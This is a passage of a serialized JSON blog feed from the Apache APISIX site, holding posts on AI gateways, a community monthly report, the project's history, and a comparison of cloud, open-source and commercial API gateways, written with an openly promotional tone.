Features","metadata":{"permalink":"/blog/2025/03/06/what-is-an-ai-gateway","source":"@site/blog/2025/03/06/what-is-an-ai-gateway.md","title":"What Is an AI Gateway? Concept and Core Features","description":"AI Gateway manages LLMs traffic, enhancing security, reliability, and observability for AI applications.","date":"2025-03-06T00:00:00.000Z","formattedDate":"March 6, 2025","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.555,"truncated":true,"authors":[{"name":"Ming Wen","title":"Author","url":"https://www.linkedin.com/in/ming-wen-api7/","image_url":"https://github.com/moonming.png","imageURL":"https://github.com/moonming.png"},{"name":"Yilia Lin","title":"Technical Writer","url":"https://github.com/Yilialinn","image_url":"https://github.com/Yilialinn.png","imageURL":"https://github.com/Yilialinn.png"}],"prevItem":{"title":"What Is an AI Gateway: Differences from API Gateway","permalink":"/blog/2025/03/21/ai-gateway-vs-api-gateway-differences-explained"},"nextItem":{"title":"Monthly Report (January 27 - February 28)","permalink":"/blog/2025/02/28/monthly-report"}},"content":">This article will explore how AI gateway address pressing API gateway concerns. Let\'s discover how AI gateways unlock the full potential of AI, turning challenges into opportunities for growth.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nIn the rapidly evolving landscape of artificial intelligence (AI), Large Language Models (LLMs) and AI agents have become integral to various applications, leading to a surge in AI-related API traffic. As organizations increasingly integrate AI into their workflows, they face new challenges in managing and optimizing AI-driven interactions.\\n\\nThe advent of open-source LLMs, such as [Deepseek](https://www.deepseek.com/), has enabled enterprises to not only utilize SaaS LLM services from providers like OpenAI and Azure but also to deploy LLMs internally, fostering a hybrid cloud architecture. This shift presents numerous challenges, including data security, multi-LLM adaptation and management, performance optimization, and reliability assurance. Addressing these challenges necessitates the evolution of a traditional API gateway into a specialized [AI gateway](https://apisix.apache.org/blog/2025/02/24/apisix-ai-gateway-features/).\\n\\n![AI emerges for data security, multi-LLM adaptation and management](https://static.api7.ai/uploads/2025/03/06/9bbxGvN5_ai-trends.webp)\\n\\nAs a PMC member of [Apache APISIX](https://apisix.apache.org/), I have also observed this trend and demand from the open-source community.\\n\\n## The Rise of LLMs and AI Agents\\n\\nLLMs and AI agents have transformed how businesses operate, offering enhanced capabilities in natural language understanding, generation, and decision-making. These AI-powered models are now being leveraged in diverse applications, such as:\\n\\n- **Customer support automation**: AI chatbots and virtual assistants are replacing traditional customer support workflows.\\n- **Code generation and software development**: AI-powered tools like GitHub Copilot and DeepSeek assist developers in writing and debugging code.\\n- **Financial and legal analysis**: AI models help professionals analyze legal contracts and financial statements.\\n- **Content generation**: AI is being used to create marketing content, news articles, and technical documentation.\\n\\nThis transformation has led to an exponential increase in API traffic as applications rely on AI services to process and generate data. The integration of AI into business processes has become a pivotal factor in maintaining a competitive edge, requiring organizations to rethink their API management strategies.\\n\\n## Emergence of Hybrid Cloud Architectures with Open-Source LLMs\\n\\nThe availability of open-source LLMs, such as Deepseek, has empowered organizations to deploy AI models within their own infrastructure. This capability facilitates a hybrid cloud approach, combining public SaaS LLM services with private deployments. While this strategy offers flexibility and control, it also introduces complexities in managing diverse AI environments, ensuring consistent performance, and maintaining security across platforms.\\n\\n### Challenges in Managing AI-Driven API Traffic\\n\\nThe integration of AI services into applications brings forth several challenges:\\n\\n#### 1. Data Security\\n\\nTransmitting sensitive information to external LLM providers raises concerns about data privacy, regulatory compliance (such as [GDPR](https://gdpr-info.eu/) and [CCPA](https://oag.ca.gov/privacy/ccpa)), and potential data leaks. Organizations must implement robust security measures, such as:\\n\\n- Data masking and redaction before sending prompts to external AI services.\\n- Role-based access control (RBAC) to limit access to sensitive AI functionalities.\\n- Encryption of data in transit and at rest to protect against unauthorized access.\\n\\n#### 2. Multi-LLM Adaptation and Management\\n\\nDifferent AI tasks require specific LLMs tailored to particular domains, such as coding, user interface design, legal analysis, or financial modeling. Enterprises need to develop strategies to efficiently:\\n\\n- Route AI requests to the most suitable model based on task requirements.\\n- Dynamically switch between different LLM providers based on cost, availability, or latency.\\n- Monitor and optimize performance across multiple AI models to ensure consistent quality.\\n\\n#### 3. Performance and Cost Optimization\\n\\nLLM inference is computationally expensive, leading to significant costs. AI gateway must help optimize resource utilization by:\\n\\n- Caching AI responses to reduce redundant API calls.\\n- Implementing token metering to track and control API usage.\\n- Load balancing AI requests across multiple providers to optimize response time and cost-efficiency.\\n\\n#### 4. Reliability\\n\\nAs AI systems become integral to business operations, ensuring their reliability is paramount. Organizations must implement mechanisms such as:\\n\\n- Retry logic and failover strategies to mitigate downtime when an LLM provider experiences service disruptions.\\n- Circuit breakers to prevent overloading AI services during peak demand.\\n- Latency-based routing to ensure users receive responses from the fastest available LLM instance.\\n\\n## The Role of AI Gateway\\n\\nTo address these challenges, the concept of an AI gateway has emerged. An AI gateway extends the functionalities of a traditional API gateway by incorporating features specifically designed for AI applications and LLM scenarios. It serves as a unified endpoint for connecting AI infrastructure and services, providing comprehensive control, security, and observability of AI traffic between applications and models.\\n\\n![APISIX AI gateway architecture](https://static.api7.ai/uploads/2025/08/01/KvjMKKx2_apisix-ai-gateway-architecture.webp)\\n\\n### Core Features of an AI Gateway\\n\\nAn effective AI gateway encompasses several key functionalities:\\n\\n#### 1. Security\\n\\n- **Token-Based Rate Limiting**: Controls the rate of requests to AI services, preventing abuse and managing resource utilization.\\n- **Prompt Protection**: Ensures that prompts sent to LLMs do not contain sensitive or inappropriate content, safeguarding against unintended data exposure.\\n- **Content Moderation**: Monitors and filters responses from AI models to prevent the dissemination of harmful or non-compliant information.\\n\\n![Security Workflow](https://static.api7.ai/uploads/2025/08/01/unlrtuQl_ai-gateway-security-feature.webp)\\n\\n#### 2. Observability\\n\\n- **Usage Tracking**: Monitors token consumption and provides insights into how AI services are utilized, aiding in cost management and capacity planning.\\n- **Logging and Auditing**: Maintains detailed records of AI interactions, supporting compliance and facilitating troubleshooting.\\n- **Real-time Monitoring**: Tracks LLM response times, error rates, and API usage patterns to ensure optimal performance.\\n\\n#### 3. Prompt Engineering\\n\\n- **Retrieval-Augmented Generation (RAG)**: Enhances prompts with relevant data to improve the quality and accuracy of AI responses.\\n- **Prompt Decorators and Templates**: Standardizes and enriches prompts to ensure consistency and effectiveness across different AI applications.\\n- **Dynamic Context Injection**: Automatically enhances user queries with contextual data to improve AI-generated responses.\\n\\n#### 4. Reliability\\n\\n- **Multi-LLM Load Balancing**: Distributes requests across multiple AI models to optimize performance and prevent overloading.\\n\\n![AI Proxy](https://static.api7.ai/uploads/2025/08/01/TmTsNypy_ai-proxy-multi-workflow.webp)\\n\\n- **Retry and Fallback Mechanisms**: Implements strategies to handle AI service failures gracefully, ensuring uninterrupted user experiences.\\n- **Traffic Prioritization**: Routes high-priority requests to the most reliable AI services while deferring less critical tasks.\\n\\n## Conclusion\\n\\nThe integration of AI into business operations presents both opportunities and challenges. As AI services are predominantly accessed via APIs, managing these interactions effectively is crucial. AI gateway offers a comprehensive solution by extending traditional API gateway functionalities to meet the specific needs of AI applications. By addressing security, observability, prompt engineering, and reliability, AI gateway enables organizations to harness the full potential of AI while maintaining control and compliance.\\n\\nAs the AI landscape continues to evolve, the role of AI gateway will become increasingly significant, serving as the backbone of secure and efficient AI deployments. Organizations adopting AI gateway will gain a competitive advantage by ensuring seamless AI interactions, optimizing costs, and maintaining high-performance AI-driven applications."},{"id":"Monthly Report (January 27 - February 28)","metadata":{"permalink":"/blog/2025/02/28/monthly-report","source":"@site/blog/2025/02/28/monthly-report.md","title":"Monthly Report (January 27 - February 28)","description":"Our monthly Apache APISIX community report generates insights into the project\'s monthly developments. The reports provide a pathway into the Apache APISIX community, ensuring that you stay well-informed and actively involved.","date":"2025-02-28T00:00:00.000Z","formattedDate":"February 28, 2025","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.27,"truncated":true,"authors":[],"prevItem":{"title":"What Is an AI Gateway? Concept and Core Features","permalink":"/blog/2025/03/06/what-is-an-ai-gateway"},"nextItem":{"title":"Explore Key Features of Apache APISIX AI Gateway","permalink":"/blog/2025/02/24/apisix-ai-gateway-features"}},"content":"> We have recently added some new features within Apache APISIX, including the `ai-proxy-multi` plugin that proxies to multiple LLM targets and `_meta.pre_function` that executes custom logic before the execution of each phase. For detailed information, please read the monthly report.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'teamwork makes the dream work\' rings true in our way and is made possible by the collective effort of our community.\\n\\nFrom January 27 to February 28, 14 contributors made 39 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.api7.ai/uploads/2025/02/28/JaHy54nf_feb-contributors.png)\\n\\n![New Contributors List](https://static.api7.ai/uploads/2025/02/28/5UPWs6yG_feb-new-contributors.jpg)\\n\\n## Recent Feature Highlight\\n\\n1. [Support `_meta.pre_function` to execute custom logic before execution of each phase](https://github.com/apache/apisix/pull/11793) (Contributor: [Revolyssup](https://github.com/Revolyssup))\\n\\nAdd `pre_function` to `_meta` of the plugin to allow some personalized code to run before all plugins run. For example, register personalized variables so that these temporary variables can be referenced and used in the plugin.\\n\\n2. [Support `ai-proxy-multi` Plugin](https://github.com/apache/apisix/pull/11986) (Contributor: [shreemaan-abhishek](https://github.com/shreemaan-abhishek))\\n\\nThe `ai-proxy-multi` plugin allows configuring multiple LLM targets for load balancing and retries.\\n\\n## Conclusion\\n\\nThe [official website](https://apisix.apache.org/) and [GitHub Issues](https://github.com/apache/apisix/issues) of Apache APISIX provide a wealth of documentation of tutorials and real-world use cases. If you encounter any issues, you can refer to the documentation, search for keywords in Issues, or participate in discussions on Issues to share your ideas and practical experiences."},{"id":"Explore Key Features of Apache APISIX AI Gateway","metadata":{"permalink":"/blog/2025/02/24/apisix-ai-gateway-features","source":"@site/blog/2025/02/24/apisix-ai-gateway-features.md","title":"Explore Key Features of Apache APISIX AI Gateway","description":"Explore the advanced features of Apache APISIX AI Gateway for efficient, secure LLM API calls, optimized traffic management, and enhanced data protection.","date":"2025-02-24T00:00:00.000Z","formattedDate":"February 24, 2025","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":4.64,"truncated":true,"authors":[],"prevItem":{"title":"Monthly Report (January 27 - February 28)","permalink":"/blog/2025/02/28/monthly-report"},"nextItem":{"title":"Why We Are Reinventing API Gateways: The Story Behind Apache APISIX","permalink":"/blog/2025/02/21/why-reinvent-api-gateways"}},"content":">This article will provide an in-depth look at the AI gateway features of the current and upcoming versions of APISIX. As a multifunctional API and AI gateway, Apache APISIX offers efficient and secure LLM API calls for AI applications.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction: The Rise of AI Agents and the Evolution of AI Gateway\\n\\nIn recent years, AI agents such as AutoGPT, Chatbots, and AI Assistants have seen rapid development. These applications rely heavily on API calls to large language models (LLMs), which have brought about challenges considering high concurrency, cost control, and security.\\n\\nTraditional API gateways primarily serve Web APIs and microservices and are not optimized for the unique needs of AI applications. This has led to the emergence of the concept of AI gateway. An AI gateway needs to provide enhanced capabilities in the following areas:\\n\\n- **Multi-LLM Proxy**: Support for multiple LLM providers to avoid vendor lock-in.\\n- **Token Rate Limiting**: Prevent API abuse and optimize cost management.\\n- **Security Protection**: Including prompt filtering and content moderation to ensure compliance of AI applications.\\n- **Smart Traffic Management**: Dynamically adjust LLM weights based on cost, latency, and stability.\\n\\nApache APISIX is not only an API gateway but also an AI gateway through its plugins, helping AI applications call LLM APIs more efficiently and securely.\\n\\n## LLM Proxy: Efficient Management of Multiple LLM Backends\\n\\nAI applications typically do not rely on a single LLM provider but need to dynamically select the best model based on requirements. For example:\\n\\n- Using OpenAI GPT-4 for general text generation and Claude for legal document processing.\\n- Switching between Mistral and Gemini to optimize cost and throughput.\\n\\n**Apache APISIX\'s LLM Proxy offers the following capabilities:**\\n\\n\u2705 Support for Multiple LLM Providers: Including OpenAI, DeepSeek, Claude, Mistral, Gemini, etc., to avoid vendor lock-in.\\n\\n\u2705 LLM Weight and Priority Management: Adjust traffic distribution based on business needs.\\n\\n\u2705 Multi-LLM Load Balancing: Dynamically adjust LLM weights based on latency, cost, and stability.\\n\\n\u2705 Retry and Fallback Mechanisms: Ensure business continuity if an LLM API fails.\\n\\n\u2705 Load Balancing Across Different Providers of the Same LLM:\\n\\nFor example:\\n\\n- Privately deployed DeepSeek.\\n- Official DeepSeek API.\\n- DeepSeek API from Volcano Engine\\n\\nUsers can flexibly allocate traffic weights among different DeepSeek providers based on latency, stability, and price to achieve the best calling strategy.\\n\\nThese capabilities enable AI applications to adapt flexibly to different LLMs, improve reliability, and reduce API calling costs.\\n\\n![AI Proxy](https://static.api7.ai/uploads/2025/08/01/TmTsNypy_ai-proxy-multi-workflow.webp)\\n\\n## AI Security Protection: Ensuring Safe and Compliant Use of AI\\n\\nAI APIs may involve sensitive data, misleading information, and potential misuse. Therefore, an AI gateway needs to provide security at multiple levels.\\n\\n**The AI security capabilities provided by Apache APISIX include:**\\n\\n\u2705 **AI RAG (Retrieval-Augmented Generation)**: Supports enterprise-owned knowledge bases to reduce LLM hallucinations and improve output reliability.\\n\\n\u2705 **Prompt Guard**: Automatically intercepts sensitive, illegal, and inappropriate prompts to prevent malicious use by users.\\n\\n\u2705 **Prompt Decorator**: Automatically adds content before and after user input to enhance the quality of LLM-generated content.\\n\\n\u2705 **Prompt Template**: Makes it easier for users to reuse standardized prompts and improve interaction experience.\\n\\n\u2705 **Response Filtering & Moderation**: Intercepts sensitive or non-compliant AI-generated content.\\n\\n\u2705 **Logging & Auditing**: Provides complete API request logs for compliance audits.\\n\\nThese security measures ensure that AI applications meet enterprise-level security requirements and avoid compliance risks due to misleading AI content.\\n\\n## Token Observability and Management: Preventing High Bills Due to API Abuse\\n\\nCalling LLM APIs consumes tokens, and API abuse can lead to significant costs. Apache APISIX provides fine-grained token monitoring and management mechanisms.\\n\\n**The token management capabilities of Apache APISIX include:**\\n\\n\u2705 Token Rate Limiting by Route/Service/Consumer/Consumer Group/Custom Dimension\\n\\n\u2705 Support for Multiple Rate Limiting Modes:\\n\\n- Single-machine vs. cluster rate limiting to accommodate different scales of AI API services.\\n- Fixed time window vs. sliding time window to flexibly control API rates.\\n\\n\u2705 Different Rate Limiting Policies for Different LLMs: Prevent cost overruns.\\n\\nThrough Apache APISIX, enterprises can achieve fine-grained management of token resources and prevent high bills due to API abuse.\\n\\n## Smart Routing: Dynamic Traffic Management for AI APIs\\n\\n![Smart Routing](https://static.api7.ai/uploads/2025/04/28/bzziWsxs_smart-routing.webp)\\n\\nDuring AI API calls, different tasks may require different LLMs. For example:\\n\\n- Code generation requests \u2192 sent to GPT-4 or DeepSeek.\\n- Long-form summarization tasks \u2192 sent to Claude.\\n- General conversations \u2192 sent to GPT-3.5 or Gemini.\\n\\n**The smart routing capabilities of Apache APISIX include:**\\n\\n\u2705 Context-Aware Routing Based on Request Content:\\n\\n- Select the optimal LLM based on prompt type.\\n- Allocate different models (GPT-4 Turbo vs. GPT-3.5) based on user level (paid vs. free users).\\n\\n\u2705 Response Caching: Reduce redundant API calls and improve response speed.\\n\\nThese capabilities help AI APIs run more efficiently, reduce API latency, and increase throughput.\\n\\n## Conclusion\\n\\nWith the rapid development of AI technology, API gateways also need to evolve to meet the unique needs of AI applications. Apache APISIX, with its LLM Proxy, token rate limiting, security protection, and smart routing features, has become the best choice for an AI gateway.\\n\\n**The core advantages of Apache APISIX compared to traditional API gateways are:**\\n\\n\ud83d\ude80 Support for Multiple LLM Providers: Avoid vendor lock-in.\\n\\n\u26a1\ufe0f Smart Traffic Scheduling: Dynamic load balancing to improve API reliability.\\n\\n\ud83d\udd12 Built-in Security Capabilities: Including prompt protection and content moderation to ensure secure and compliant AI APIs.\\n\\n\ud83d\udcb0 Token Rate Limiting: Prevent high bills due to API abuse.\\n\\n\ud83d\udcca High-performance Architecture: Meet the high concurrency needs of AI applications.\\n\\nIf you are building AI-related applications and want to have both a powerful API gateway and AI gateway, give Apache APISIX a try!"},{"id":"Why We Are Reinventing API Gateways: The Story Behind Apache APISIX","metadata":{"permalink":"/blog/2025/02/21/why-reinvent-api-gateways","source":"@site/blog/2025/02/21/why-reinvent-api-gateways.md","title":"Why We Are Reinventing API Gateways: The Story Behind Apache APISIX","description":"Discover the journey of Apache APISIX, from a small windowless office to a global open-source success. Learn why we created APISIX, its rapid growth, and how it addresses modern API gateway needs.","date":"2025-02-21T00:00:00.000Z","formattedDate":"February 21, 2025","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":4.195,"truncated":true,"authors":[{"name":"Ming Wen","title":"Author","url":"https://www.linkedin.com/in/ming-wen-api7/","image_url":"https://github.com/moonming.png","imageURL":"https://github.com/moonming.png"},{"name":"Yilia Lin","title":"Technical Writer","url":"https://github.com/Yilialinn","image_url":"https://github.com/Yilialinn.png","imageURL":"https://github.com/Yilialinn.png"}],"prevItem":{"title":"Explore Key Features of Apache APISIX AI Gateway","permalink":"/blog/2025/02/24/apisix-ai-gateway-features"},"nextItem":{"title":"Cloud vs Open Source vs Commercial API Gateways: Which One Fits Your Needs?","permalink":"/blog/2025/02/17/cloud-vs-open-source-vs-commercial-api-gateways"}},"content":"<head>\\n  <link rel=\\"canonical\\" href=\\"https://www.linkedin.com/pulse/why-we-reinventing-api-gateways-story-behind-apache-apisix-ming-wen-h3yqc/\\" />\\n</head>\\n\\n>Apache APISIX has quickly become a leading API gateway, with over 460 contributors and 15K+ GitHub stars. This article explores its journey from a small project to a widely-used, open-source solution, addressing key challenges in modern API management.\\n\\n\x3c!--truncate--\x3e\\n\\nIn just over five years, Apache APISIX has grown from a new open-source project to one of the most widely used API gateways in the world. Today, APISIX is an Apache Software Foundation (ASF) Top-Level Project, with over 460 contributors, 15K+ GitHub stars, and 100+ plugins. It is deployed across industries like telecommunications, automotive, financial services, and retail, with some of the largest known users running APISIX on over 10,000 CPU cores.\\n\\nBut how did this all start?\\n\\nTo answer that, we need to go back to early 2019, when two engineers, working in a small windowless office, started building an API gateway from scratch. This article tells the story of why we created APISIX, and why we open-sourced it and donated to the Apache Software Foundation.\\n\\n## The Beginning: From a Windowless Room to a Global Open-Source Project\\n\\nBack in 2019, existing API gateways had already been around for years. However, as cloud-native technologies and microservices architectures gained momentum, we saw a growing gap between the available API gateways and the new requirements emerging in modern infrastructures.\\n\\nAfter months of research, we identified several critical pain points that existing solutions like NGINX and Kong API Gateway failed to address:\\n\\n- **Configuration synchronization**: Needed real-time, incremental config updates across distributed API gateways.\\n- **Immediate configuration application**: Changes should take effect in milliseconds, not minutes.\\n- **High scalability**: Should handle 100K+ routes efficiently without performance degradation.\\n- **Hot reloading**: Plugin updates and configuration changes shouldn\'t require process restarts.\\n\\nDetermined to solve these problems, we spent several months designing and developing an MVP (Minimum Viable Product). We made three key architectural choices that still differentiate APISIX today:\\n\\n1. **Using etcd for configuration storage and synchronization**, ensuring real-time updates across distributed nodes.\\n\\n2. **Adopting a prefix tree (Trie) for route matching**, enabling ultra-fast lookups even with thousands of routes.\\n\\n3. **Leveraging Lua for plugin execution**, allowing hot-reloading of plugins without restarting the gateway.\\n\\nBy mid-2019, we open-sourced our work and released APISIX on GitHub.\\n\\n## Becoming an Apache Top-Level Project\\n\\nIn October 2019, we decided to donate APISIX to the Apache Software Foundation (ASF). By July 2020, just nine months later, APISIX graduated as an Apache Top-Level Project\u2014one of the fastest-growing open-source projects in ASF history.\\n\\nThroughout this journey, we worked without external funding, no VC backing, and no income for over a year. It was purely driven by our belief that the world needed a modern, high-performance, and open API gateway.\\n\\n## Why Did We Create APISIX?\\n\\nMany API gateways already existed\u2014so why reinvent the wheel?\\n\\nWe saw an opportunity to fundamentally improve API management by addressing the following key technical gaps:\\n\\n![API Gateway Feature Gap](https://static.api7.ai/uploads/2025/02/21/1rsgP5ka_api-gateway-feature-gap.jpeg)\\n\\nIf your API gateway requirements include:\\n\\n\u2705 Real-time, millisecond-level config synchronization\\n\\n\u2705 Handling thousands of routes without latency spikes\\n\\n\u2705 Ultra-low latency (under 5ms) for API processing\\n\\n\u2705 Hot plugin reloading without restarting the gateway\\n\\nThen Apache APISIX is your best choice.\\n\\n## Why Did We Donated APISIX to the Apache Software Foundation?\\n\\nMany open-source projects are controlled by a single vendor, which can lead to licensing changes (as seen with Redis and ELK). Our goal wasn\'t just to build a successful product at API7 but to ensure that APISIX remains a truly open project for the global community.\\n\\nBy donating APISIX to the Apache Software Foundation, we ensured:\\n\\n- **Vendor neutrality**: No single company controls APISIX.\\n- **Long-term sustainability**: The project follows Apache governance, protecting its open-source nature.\\n- **Global adoption**: Apache projects are trusted by enterprises worldwide.\\n\\nThis decision wasn\'t made lightly\u2014building a successful commercial company (API7.ai) while simultaneously donating its core technology was an unconventional path. However, we believed this was the best way to maximize APISIX\'s impact.\\n\\n## A New Path for Open Source and Business\\n\\nMost companies either:\\n\\n1. Start open-source projects as side projects while building their business first.\\n2. Keep key technologies closed-source to maintain a competitive edge.\\n\\nWe did the opposite:\\n\\n- **2019**: Built APISIX from scratch.\\n- **2019**: Open-sourced APISIX on GitHub.\\n- **2019**: Donated it to Apache Software Foundation.\\n- **2020**: APISIX became an Apache Top-Level Project.\\n- **2021**: Expanded API7 from a two-person team into a company offering enterprise solutions based on APISIX.\\n\\nThis unique journey means that APISIX is engineer-led, community-driven, and deeply committed to open-source principles\u2014something rare in today\'s software landscape.\\n\\n## Conclusion: Reinventing API Gateways with an Open Future\\n\\nOur mission with APISIX was never just about building a product\u2014it was about reshaping API management for the cloud-native era.\\n\\nWith a thriving global community, rapid innovation, and enterprise adoption, Apache APISIX is set to become the de facto API gateway for modern applications.\\n\\nWhether you\'re a startup, enterprise, or open-source enthusiast, if you\'re looking for a high-performance, cloud-native API gateway, we invite you to explore APISIX."},{"id":"Cloud vs Open Source vs Commercial API Gateways: Which One Fits Your Needs?","metadata":{"permalink":"/blog/2025/02/17/cloud-vs-open-source-vs-commercial-api-gateways","source":"@site/blog/2025/02/17/cloud-vs-open-source-vs-commercial-api-gateways.md","title":"Cloud vs Open Source vs Commercial API Gateways: Which One Fits Your Needs?","description":"This article explores the differences between cloud-managed, open-source, and commercial API gateways.","date":"2025-02-17T00:00:00.000Z","formattedDate":"February 17, 2025","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":4.65,"truncated":true,"authors":[{"name":"Ming Wen","title":"Author","url":"https://www.linkedin.com/in/ming-wen-api7/","image_url":"https://github.com/moonming.png","imageURL":"https://github.com/moonming.png"},{"name":"Yilia Lin","title":"Technical Writer","url":"https://github.com/Yilialinn","image_url":"https://github.com/Yilialinn.png","imageURL":"https://github.com/Yilialinn.png"}],"prevItem":{"title":"Why We Are Reinventing API Gateways: The Story Behind Apache APISIX","permalink":"/blog/2025/02/21/why-reinvent-api-gateways"},"nextItem":{"title":"Analyzing API Gateway Adoption Rates Through Internet Data","permalink":"/blog/2025/02/06/analyzing-api-gateway-adoption-rates"}},"content":"This article explores the differences between cloud-managed, open-source, and commercial API gateways. It highlights key pros and cons, pricing risks, and strategic recommendations for businesses that anticipate API growth and hybrid cloud adoption.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nAPI gateways have become essential components in modern cloud architectures. They provide security, traffic management, observability, and service orchestration\u2014critical for handling APIs at scale. However, with multiple API gateway solutions available, choosing the right one can be challenging.\\n\\nBroadly, API gateways fall into three categories:\\n\\n- **Cloud API Gateways** (e.g., <a href=\\"https://aws.amazon.com/api-gateway/\\" rel=\\"nofollow\\">Amazon API Gateway</a>, <a href=\\"https://cloud.google.com/apigee\\" rel=\\"nofollow\\">Google Apigee</a>)\\n- **Open Source API Gateways** (e.g., [Apache APISIX](https://apisix.apache.org/), Kong Gateway, Tyk)\\n- **Commercial API Gateways** (e.g., <a href=\\"https://www.mulesoft.com/\\" rel=\\"nofollow\\">MuleSoft</a>, <a href=\\"https://boomi.com/\\" rel=\\"nofollow\\">Boomi</a>)\\n\\nEach option has its advantages and trade-offs. This article provides a deep dive into their differences, hidden risks, and a **strategic recommendation** for companies looking to scale API usage and adopt hybrid cloud architectures.\\n\\n## Cloud API Gateways: Convenience vs. Lock-in\\n\\n### Pros:\\n\\n\u2705 Fully managed, reducing operational burden\\n\\n\u2705 Deep integration with cloud provider services (IAM, logging, monitoring)\\n\\n\u2705 High availability and auto-scaling out of the box\\n\\n### Cons:\\n\\n\u274c **Vendor Lock-in**: API definitions, policies, and configurations are tied to the cloud provider\\n\\n\u274c **No Customization**: Cloud API gateways are closed-source, limiting the ability to add custom plugins or functionality\\n\\n\u274c **No Hybrid Cloud Support**: Cloud-managed API gateways cannot be deployed on-premise or across multi-cloud environments\\n\\n### Use Case:\\n\\nCloud API gateways are ideal for **startups and small teams** that need a quick, managed solution without worrying about infrastructure maintenance. However, as API traffic grows or hybrid cloud requirements arise, their limitations become apparent.\\n\\n\ud83d\udd39 **Example**: Amazon API Gateway is a popular choice for cloud-native applications but lacks flexibility for on-premises deployments.\\n\\n## Open Source API Gateways: Control and Flexibility\\n\\n### Pros:\\n\\n\u2705 Fully customizable, allowing teams to extend functionality as needed\\n\\n\u2705 No licensing fees, reducing costs in the long run\\n\\n\u2705 Can be deployed anywhere\u2014**on-prem, multi-cloud, hybrid cloud**\\n\\n### Cons:\\n\\n\u274c **Operational Overhead**: Requires self-hosting, upgrades, and security management\\n\\n\u274c **Governance Risks**: Some open-source projects are controlled by a single vendor, which may later change licensing terms (e.g., Redis, ELK Stack)\\n\\n\u274c **Scalability Complexity**: Running an open-source API gateway at enterprise scale requires expertise in deployment and maintenance\\n\\n## Key Consideration: Choosing a Foundation-Owned Open Source Project\\n\\nSome open-source API gateways are **vendor-controlled**, meaning the company behind them can change licensing terms. For example, Redis and Elasticsearch modified their open-source licenses to prevent cloud providers from offering managed services.\\n\\nTo **avoid future licensing risks**, it\'s safer to choose an API gateway governed by a **neutral open-source foundation**, such as:\\n\\n- [Apache APISIX (Apache Software Foundation)](https://apisix.apache.org/)\\n- <a href=\\"https://www.envoyproxy.io/\\" rel=\\"nofollow\\">Envoy Proxy (Cloud Native Computing Foundation)</a>\\n\\n## Commercial API Gateways: Enterprise Features with Pricing Risks\\n\\n### Pros:\\n\\n\u2705 **Enterprise-grade security**\\n\\n\u2705 **SLA-backed support** with 24/7 assistance\\n\\n\u2705 **Monetization and API analytics** for businesses offering APIs as a service\\n\\n### Cons:\\n\\n\u274c **High Licensing Costs**: Typically charged per API call, which can become expensive\\n\\n\u274c **Potential Pricing Changes**: Many vendors modify pricing models over time, significantly increasing costs (e.g., Apigee, Kong Enterprise)\\n\\n\u274c **Limited Deployment Flexibility**: Some solutions require vendor-managed infrastructure, reducing control\\n\\n### Use Case:\\n\\nBest suited for **large enterprises** with strict security, compliance, and SLA requirements. However, pricing unpredictability is a concern\u2014many companies have faced sudden cost increases.\\n\\n## Strategic Recommendation: A Hybrid Approach for Growth\\n\\nIf your API traffic is **growing rapidly** and **hybrid cloud** is part of your strategy, the best approach is:\\n\\n**1. Start with an Open Source API Gateway**\\n\\n- Avoid vendor lock-in\\n- Maintain control over deployment and customization\\n- Lower costs by eliminating per-call fees\\n\\n**2. Upgrade to a Commercial Version When Needed**\\n\\n- When security requirements increase\\n- When managing multi-cluster deployments\\n- When enterprise support and SLAs become necessary\\n\\nBy following this approach, you get the best of both worlds: flexibility, cost control, and enterprise-grade features when needed.\\n\\n\ud83d\udd39 **Example Strategy**: A company starts with Apache APISIX (open source) and later upgrades to [API7 Enterprise](https://api7.ai/) when requiring advanced security and SLA support.\\n\\n## FAQ: Common Questions About API Gateway Selection\\n\\n**1. Why not start with a cloud API gateway and switch later?**\\n\\nSwitching API gateways is complex due to differences in configurations, rate-limiting rules, authentication methods, and monitoring setups. If hybrid cloud or multi-cloud is part of your strategy, starting with an open-source gateway ensures long-term flexibility.\\n\\n**2. How do I avoid open-source licensing risks?**\\n\\nChoose projects governed by neutral software foundations (e.g., Apache Software Foundation, CNCF). Avoid projects fully controlled by a single company, as they may change their licensing model.\\n\\n**3. What is the best API gateway for hybrid cloud?**\\n\\nOpen-source gateways like Apache APISIX and Envoy Proxy offer full deployment flexibility, making them ideal for hybrid and multi-cloud architectures.\\n\\n## Conclusion: Making the Right Choice\\n\\nChoosing the right API gateway depends on your **scalability, budget, and cloud strategy**:\\n\\n| Criteria                  | Cloud API Gateway          | Open Source API Gateway    | Commercial API Gateway     |\\n|---------------------------|----------------------------|----------------------------|----------------------------|\\n| **Cost**                      | High (Pay per API call)    | Low (Free)                 | High (License fees)        |\\n| **Customization**             | Limited                    | Full control               | Limited                    |\\n| **Deployment Flexibility**    | Cloud-only                 | Anywhere (Hybrid, Multi-cloud) | Varies                     |\\n| **Enterprise Features**       | Basic                      | Requires customization     | Advanced (Security, Compliance) |\\n| **Support**                   | Cloud provider support     | Community-driven           | SLA-backed                 |\\n\\nIf **API traffic is growing rapidly** and **hybrid cloud adoption is planned**, a **hybrid approach**\u2014starting with **open source** and upgrading to a **commercial enterprise solution** when needed\u2014offers the best flexibility and cost efficiency."},{"id":"Analyzing API Gateway Adoption Rates Through Internet Data","metadata":{"permalink":"/blog/2025/02/06/analyzing-api-gateway-adoption-rates","source":"@site/blog/2025/02/06/analyzing-api-gateway-adoption-rates.md","title":"Analyzing API Gateway Adoption Rates Through Internet Data","description":"Explore 2025 API gateway adoption trends with data-driven insights on Kong, Apache APISIX, Traefik, WSO2, and KrakenD. Learn how companies and regions shape API gateway usage.","date":"2025-02-06T00:00:00.000Z","formattedDate":"February 6, 